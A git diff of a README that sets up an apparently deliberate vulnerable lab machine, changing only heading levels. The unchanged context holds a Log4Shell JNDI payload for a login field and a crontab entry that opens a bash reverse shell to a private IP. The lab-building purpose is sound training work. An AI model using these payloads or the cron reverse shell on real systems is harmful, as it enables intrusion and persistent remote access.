@@ -71,7 +71,7 @@ sudo systemctl enable --now ssh
 
 ```
 
-# Configure the James Server Phonix.sh script 
+## Configure the James Server Phonix.sh script 
 ```
 export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64"
 export JAVA_HOME
@@ -106,7 +106,7 @@ chmod + startjamesserver.sh
 
 ./startjamesserver.sh to start the server.
 
-# Apache Tomcat Configuration
+## Apache Tomcat Configuration
 Open the tomcat-users.xml in the /opt/apache-tomcat-9.0.68/conf
 
 Modify the manager section of the tomcat-users.xml file as follows:
@@ -164,7 +164,7 @@ chmod +x startapache.sh
 sudo ./startapache.sh
 ```
 
-# Log4j PoC
+## Log4j PoC
 
 Modify the poc.py file to point to the jAVA_HOME as follows:
 ```
@@ -245,7 +245,7 @@ Once it is running, you can access it on localhost:8080
 
 Copy the payload ${jndi:ldap://localhost:1389/a} and paste it in the username field of the vulnerable site. Click on the Login button to pop a shell.
 
-# Samba config
+## Samba config
 ### Create Users password
 ```
 sudo adduser username
@@ -306,7 +306,7 @@ sudo nano /etc/samba/smb.conf
 ### Restart
 sudo systemctl restart smbd
 
-# Crontab configuration
+## Crontab configuration
 Go to sudo nano /etc/crontab
 
 Edit the cron job file as below:
@@ -351,7 +351,7 @@ PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #bash -i  >&  /dev/tcp/192.168.50.245/1234  0  >&1 
 bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 ```
-# SSH
+## SSH
 * Login as one of the samba users
 * sudo su josh
 * Generate ssh key and add it to the authorized_keys
@@ -370,9 +370,6 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * Login with you ssh key
 * Once it works go back to the server and enable password authentication
 * sudo systemctl restart ssh
-
-
-
 
 # References
 * https://github.com/kozmer/log4j-shell-poc
